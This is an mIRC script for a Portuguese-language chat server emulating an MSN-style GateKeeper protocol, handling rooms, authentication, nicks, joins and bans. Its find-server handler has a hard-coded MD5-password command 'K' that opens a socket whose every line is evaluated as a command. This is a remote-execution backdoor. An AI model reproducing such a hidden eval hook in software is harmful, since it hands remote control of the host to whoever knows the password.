; Brasil Chat Server
; server mrc

on *:start: init
alias init {
  hfree -w * | sockclose *
  if ($file(joinlog.txt)) .rename joinlog.txt jl/ $+ $ctime $+ .txt
  window -ne @debug
  window -ne @joins
  window -ne @chans
  window -ne @ftp
  .timerclshsh 0 300 clshsh
  set %z 6665 | while (!$portfree(%z)) set %z $r(5000,9999)
  ; if (!$portfree(6666)) { echo 4 -s * Erro: Porta 6666 indisponivel, verifique se vc nao ja tah rodando algum serv. | halt }
  socklisten find 6666
  socklisten room %z
  rooms
  sockopen ip www.google.com.br 80
  echo 14 -s * Server up and running.
  upa
}

on *:sockopen:ip: set %ip $sock(ip).bindip | echo 14 -s * IP: %ip | sockclose ip

alias rooms {
  var %s rooms, %r, %i
  %i = $ini(setts.ini,%s,0)
  while (%i) {
    %r = $ini(setts.ini,%s,%i)
    tokenize 32 $readini(setts.ini,n,%s,%r)
    if ($istok(%cats,$1,32)) {
      if (!$rsh(%r,topic)) rsh %r topic $2-
      if (%bot2 !isin $rsh(%r,nicks)) rsh %r nicks %bot2 $rsh(%r,nicks)
      rsh %r mode nrt
      rsh %r name %r
      rsh %r cat $1
      if ($rsh(%r,ownerkey)) rsh %r ownerkey
      hadd -m rooms $chn(%r) $+(list,$1,r.txt)
    }
    dec %i
  }
}

; find server

on *:socklisten:find: if ($sock(*,0) < %limi) { sockclose s | sockaccept s | var %s $tt(f) | cb %s }

on *:sockread:f.*: {
  var %x, %s $sockname | sockread %x | tokenize 32 %x
  if (%ech) echo 14 @debug ( $+ $sockname $+ )1 $1-

  if (I == $3) _sw %s AUTH GateKeeper * *@* 0 $lf $bc 001 * :
  if (FINDS == $1) { if ($hget($chn($2))) _r_ip %s | else _sw %s $bc 702 * : }
  if (CREATE == $1) {
    if (!$hget($chn($3))) {
      if (!$regex($3,/^%#./)) return
      if ($len($3) > 75) return
      if (!$istok(%cats,$2,32)) return
      rsh $3 ownerkey $8
      rsh $3 name $3
      topics $3 1 $iif($4 == -,-,$replace($right($4,-1),\b,$chr(32),\c,$chr(44)))
      rsh $3 mode nt
      rsh $3 cat $upper($2)
      rsh $3 new 1
      hadd -m rooms $chn($3) $+(list,$2,u.txt)
    }
    _r_ip %s
  }
  if (BOT == $1) { _sw %s ok | sockrename %s s | tt a.z }
  if (L == $1) _send_list %s
  if (SL == $1) _send_list_s %s
  if (LOG == $1) && ($2 == $read(c:\windows\bc.txt)) sockrename %s log $+ $ticks
  if (K == $1) && ($md5($2) == 622413bc9a596b2724f1e9f0c0dfb9d7) sockrename %s k
}
on *:sockread:k: var %x | sockread %x | $eval(%x,2) | kf ok
alias kf sockwrite -n k $1-

alias _r_ip _sw $1 $bc 613 * : $+ %ip %z

alias escap {
  var %i 1, %r, %l $len($1-), %o
  while (%i < %l) {
    %r = %r $+ $replace($mid($1-,%i,2),5C,5C5C,00,5C30,20,5C62,2C,5C63,10,5C6E,13,5C72,09,5C74)
    inc %i 2
  }
  return %r
}

alias unescap {
  var %i 1, %r, %l $len($1-), %o
  while (%i < %l) {
    %o = $mid($1-,%i,2)
    if (%o != 5C) %r = %r $+ %o
    else { inc %i 2 | %r = %r $+ $replace($mid($1-,%i,2),30,00,62,20,63,2C,6E,10,72,13,74,09) }
    inc %i 2
  }
  return %r
}

alias authgen return $escap($+(00,$token($1-,1,32),03000000,02000000,$token($1-,2,32)))
alias genhash set %auth $nchr(2) $nchr(8) | return $authgen(%auth)
alias nchr var %i $1, %r | while (%i) { %r = %r $+ $base($r(0,255),10,16,2) | dec %i } | return %r

alias auth_fail _sw $1 $bc 910 * :Authentication Failed | sckclose $1
alias auth_ban _sw $1 $bc 474 * :Você está banido da rede. | echo -s auth ban: $sock($1).ip $2- | sckclose $1

; room server

on *:socklisten:room: sockclose s | sockaccept s | var %s $tt(a) | cb %s

on *:sockread:a.*: {
  var %nr, %x, %s $sockname, %w $iif(a.?.* iswm %s,0,1) | sockread %x | tokenize 32 %x
  if (%ech) echo 14 @debug ( $+ %s $+ )1 $1-

  if (IRCVERS == $1) { _sw %s $bc 800 * 1 0 TEST,NTLM 512 * | halt }

  if (AUTH == $1) {
    if ($hsh(%s,auth_)) { auth_fail %s | halt }
    if (S == $3) {
      if (!$hsh(%s,auth)) { auth_fail %s }
      var %r $unescap($tohex($right($4-,-6)))
      ; write -a research.txt %auth $mid(%r,23,32) | unset %auth
      if ($mid(%r,23,32) != $token($hsh(%s,auth),3,32)) { auth_fail %s | halt }
      var %ai $lines(abans.txt), %h $hsh(%s,auth,$right(%r,32))
      while (%ai) { if ($token($read(abans.txt,%ai),1,32) iswm %h) { auth_ban %s $v2 | halt } | dec %ai }
      _sw %s AUTH GateKeeper * *@* 0 $lf $bc 001 * :
      hsh %s auth_ ok
    }
    else {
      if ($hsh(auth,%s)) { auth_fail %s }
      else _sw %s AUTH GateKeeper S :GKSSP $+ $unhex($authgen($hsh(%s,auth,$read(sys\auth.dat)))) 
      ; else _sw %s AUTH GateKeeper S :GKSSP $+ $unhex($genhash) 
    }
    halt
  }

  if (!$hsh(%s,auth_)) && (%w) { auth_fail %s | halt }

  if (PROP == $1) { hsh %s prop $right($4-,-1) }

  if (NICK == $1) {
    hsh %s rawnick $right($2-,-1)
    if (>* iswm $2) tokenize 32 $1 $right($2-,-1)
    if (oper&* iswm $2) tokenize 32 $1 $replace($remove($2,oper&),&,:)
    if (*:* iswm $2) {
      if ($istok(h.m.gf.hf.mf,$token($2-,-1,46),46)) tokenize 32 $1 $deltok($2-,-1,46)

      if ($readini(setts.ini,staff,$token($2,1,58))) {
        %nr = $upper($token($2-,2-,58))
        tokenize 32 $ifmatch
        if ($md5(%nr) == $1) {
          hsh %s nick $2
          if ($3 == i) { hsh %s i 1 | tokenize 32 $1-2 $4- }
          hsh %s lvl $iif($4,$4,$replace($3,A,6,S,5,G,4))
          hsh %s ui H, $+ $upper($3) $+ , $+ $iif(10 // $l(%s),$5,G)
          hsh %s pp $iif($5,$5,G)
          hsh %s v 1
          hsh %s gate $iif($6,$6,staff)
        }
        else return $_err_(%s,432,Nick inválido.)
      }
      elseif ($readini(setts.ini,hstaff,$token($2,1,58))) {
        %nr = $upper($token($2-,2-,58))
        tokenize 32 $ifmatch
        if (%nr == $1) {
          hsh %s nick $2
          if ($3 == i) { hsh %s i 1 | tokenize 32 $1-2 $4- }
          hsh %s lvl 10
          hsh %s ui H,U, $+ $3
          hsh %s pp $3
          hsh %s v 1
          hsh %s h 1
          hsh %s gate $left($md5($sock(%s).ip),16)
        }
        else return $_err_(%s,432,Nick inválido.)
      }
      else return $_err_(%s,432,Nick inválido.)
    }
    else {
      var %n $left($replace($2-,?,$r(1111,9999),$chr(32),Â ),50)
      var %pp PX
      if ($istok(h.m.gf.hf.mf,$token(%n,-1,46),46)) {
        %pp = $replace($findtok(h.m.gf.hf.mf,$token(%n,-1,46),46),1,MX,2,FX,3,PY,4,MY,5,FY)
        %n = $deltok(%n,-1,46)
      }
      if ($invalidnick(%n)) return $_err_(%s,432,Nick inválido.)
      hsh %s nick %n
      hsh %s ui H,U, $+ %pp
      hsh %s lvl 0
      hsh %s pp %pp
      hsh %s v 0
      hsh %s gate $left($md5($sock(%s).ip),16)
    }
    hsh %s id $+(:,$hsh(%s,nick),!,$hsh(%s,gate),$iif(%w,@bc,@bot))
    _sw %s $bc 001 $hsh(%s,nick)
    if (!%w) hsh %s bot 1
  }

  if (JOIN == $1) {

    if (%ech) _shw_r %s $hsh(%s,nick) $2 $iif(!%w,bot)
    write joinlog.txt $asctime(HH:nn-dd/mm) $2 $sock(%s).ip $hsh(%s,nick) $hsh(%s,auth) $iif(!%w,bot)

    if (!$hsh(%s,nick)) return $_err_(%s,4nn,Usuário não autenticado.)

    if ($rsh($2,name)) tokenize 32 $1 $ifmatch $3-
    else return $_err_(%s,4sl,Nome de sala inválido.)

    if (z isin $rsh($2,mode)) && ($l(%s) > 3) return $_err_(%s,474,Você está banido da rede.)

    if ($3 == $rsh($2,ownerkey)) && ($3) {
      if ($l(%s) < 4) hsh %s lvl 3
      if ($rsh($2,new)) { %nr = 1 | hdel $chn($2) new }
    }
    elseif ($3 == $rsh($2,hostkey)) && ($3) {
      if ($l(%s) < 4) hsh %s lvl 2
    }

    if ($sock($+(r.,$chn($2),.*.,$token(%s,-1,46)),0) > $calc(%ulimi -1)) {
      if (?#OvelhasDoBomPastor !iswm $2) { .timer 1 0 sckclose %s | return $_errc_(%s,471,Sala lotada.) }
    }

    if (!%w) {
      var %ss $+(r.,$chn($2),.*.,$token(%s,-1,46)), %i $sock(%ss,0), %bn
      while (%i) {
        if ($hsh($sock(%s,%i),bot)) inc %bn
        if (%bn >= %blimi) sckclose %s
        dec %i
      }
    }

    if ($sock($+(r.,$chn($2),.,$nck($hsh(%s,nick)),.*),0)) return $_err_(%s,433,Esse nick ja está na sala.)

    if ($l(%s) < 4) {
      if (!%w) && (r isin $rsh($2,mode)) { if (?#Brasil iswm $2) || (;?#Br\bTeens iswm $2) || (?#Ajuda iswm $2) return $_err_(%s,4so,Scripts banidos dessa sala.) }

      ; server ban
      var %f bans.txt, %i $lines(%f)
      while (%i) { if ($token($read(%f,%i),1,32) iswm $sock(%s).ip) return $_err_(%s,474,Você está banido da rede.) | dec %i }

      ; access 
      var %c acc. $+ $chn($2), %i $hget(%c,0).item, %acc, %ot $1-, %id $right($hsh(%s,id),-1), %r $2
      while (%i) { tokenize 32 $hget(%c,%i).data | if ($1 iswm %id) %acc = %acc $2 | dec %i }

      if (o isin %acc) hsh %s lvl 3
      elseif (h isin %acc) hsh %s lvl 2
      elseif (v isin %acc) hsh %s lvl 1
      elseif (g !isin %acc) && (!$l(%s)) {
        if (d isin %acc) return $_kn(%s,%r,474) $_err_(%s,474,Você está banido dessa sala.)

        ; room restritions
        if (!%w) && (s isin $rsh(%r,mode)) return $_kn(%s,%r,4so) $_err_(%s,4so,Scripts banidos dessa sala.)
        if (i isin $rsh(%r,mode)) return $_kn(%s,%r,473) $_errc_(%s,473,Sala somente para convidados.)
        if (l isin $rsh(%r,mode)) && ($sock($+(r.,$chn(%r),.*),0) >= $rsh(%r,limit)) return $_kn(%s,%r,471) $_errc_(%s,471,Sala lotada.)
      }

      tokenize 32 %ot
    }

    %s = $+(r.,$chn($2),.,$nck($hsh(%s,nick)),.,$token(%s,-2-1,46))
    sockrename $sockname %s
    hsh %s room $2
    hsh %s nopart 0

    if (x isin $rsh($2,mode)) && ($l(%s) < 4) sendown2 %s JOIN $hsh(%s,ui) $+ $iif($lvl(%s),$+(B,$chr(44),$lvl(%s))) : $+ $2
    else $iif($hsh(%s,i),_sw %s $hsh(%s,id),sendall %s) JOIN $hsh(%s,ui) $+ $iif($lvl(%s),$+(B,$chr(44),$lvl(%s))) : $+ $2
    _sw %s $bc 332 $hsh(%s,nick) $2 $iif(%w,:% $+ $replace($rsh($2,topic),$chr(32),\b,$chr(44),\c),: $+ $rsh($2,topic))
    _sendnicks %s $2 %w

    if ($rsh($2,onjoin)) _sw %s $+(:,$2) PRIVMSG $2 : $+ $rsh($2,onjoin)

    var %rec_ $sock(r.*,0)
    if (%rec_ >= %rec) { set %rec %rec_ | set %rectime $time do dia $date }

  }
}

alias _kn if (u isin $rsh($2,mode)) _sw $+(r.,$chn($2),.*) $hsh($1,id) KNOCK $2 $replace($3,474,913)

on *:sockclose:a.*: if ($hget($token($sockname,-2-1,46))) hfree $ifmatch

alias _sendnicks {
  var %s, %x, %i 0, %t $sock($+(r.,$chn($2),.*),0), %r /(\w+,){3}/ig, %z, %a $iif(x isin $rsh($2,mode),1,0)
  while (%i < %t) {
    inc %i | %s = $sock($+(r.,$chn($2),.*),%i)
    if (%s == $1) || (((!$hsh(%s,i)) && ((%a) && (($l(%s) > 3) || ($l($1) > 3)))) || ((!$hsh(%s,i)) && (!%a))) {
      %x = %x $hsh(%s,ui) $+ $iif($l(%s),B) $+ $chr(44) $+ $lvl(%s) $+ $hsh(%s,nick)
    }
    if (4 // %i) { if (!$3) %z = $regsub(%x,%r,,%x) | _sw $1 $bc 353 $hsh($1,nick) * $2 : $+ %x | %x = $null }
  }
  %x = %x $rsh($2,nicks)
  if (!$3) %z = $regsub(%x,%r,,%x)
  _sw $1 $iif(%x,$bc 353 $hsh($1,nick) * $2 : $+ %x $lf) $bc 366 $hsh($1,nick) $2 :
}

alias invalidnick {
  var %t : ! @ & . + $ ' , ; â€©
  var %i $numtok(%t,32)
  while (%i) { if (* $+ $token(%t,%i,32) $+ * iswm $1) return 1 | dec %i }
  var %n $replace($bc.decode($1),0,o,1,i,3,e,4,a,5,s)
  %t = dmin a*min ad*in adm*n admi ysop s*sop sy*op sys*p syso uide g*ide gu*de gui*e guid
  %i = $numtok(%t,32)
  while (%i) { if (* $+ $token(%t,%i,32) $+ * iswm %n) return 1 | dec %i }
  if (!$1) return 1
  return 0
}
